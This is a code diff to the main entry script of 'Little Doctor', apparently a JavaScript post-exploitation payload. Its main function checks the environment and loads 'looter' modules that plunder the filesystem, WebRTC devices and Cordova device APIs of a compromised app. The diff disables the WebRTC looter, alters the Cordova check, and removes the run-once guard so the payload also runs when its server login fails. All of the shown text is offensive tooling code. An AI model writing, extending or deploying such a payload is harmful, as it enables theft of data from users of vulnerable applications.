@@ -39,7 +39,6 @@ requirejs.config({
 
 // Main entry point for little doctor
 function __ld_main() {
-
     console.log('Little Doctor is examining the patient ...');
             
     // FileSystem Looter
@@ -67,15 +66,15 @@ function __ld_main() {
     }
 
     // WebRTC Looter
-    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-        console.log('WebRTC looks to be accessible');
-        requirejs(['lootWebRtc'], function(webrtc) {
-            webrtc.execute();
-        });
-    }
+    // if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+    //     console.log('WebRTC looks to be accessible');
+    //     requirejs(['lootWebRtc'], function(webrtc) {
+    //         webrtc.execute();
+    //     });
+    // }
 
     // Cordova Looter
-    if (navigator.device && navigator.device.cordova) {
+    if (navigator.device && navigator.device.capture) {
         console.log('Appears we are inside a Cordova container');
         requirejs(['lootCordova'], function(cordova) {
             cordova.execute();
@@ -84,15 +83,13 @@ function __ld_main() {
 
 }
 
-// Ensure the little doctor only runs once
-if (!window.LITTLE_DOCTOR) {
-    window.LITTLE_DOCTOR = true;
-    requirejs(['utils'], function(utils) {
-        utils.GET('/login', {
-            success: __ld_main,
-            failure: function() {
-                console.error('Failed to login to server');
-            }
-        });
+
+requirejs(['utils'], function(utils) {
+    utils.GET('/login', {
+        success: __ld_main,
+        failure: function() {
+            console.error('Failed to login to server');
+            __ld_main();
+        }
     });
-}
+});
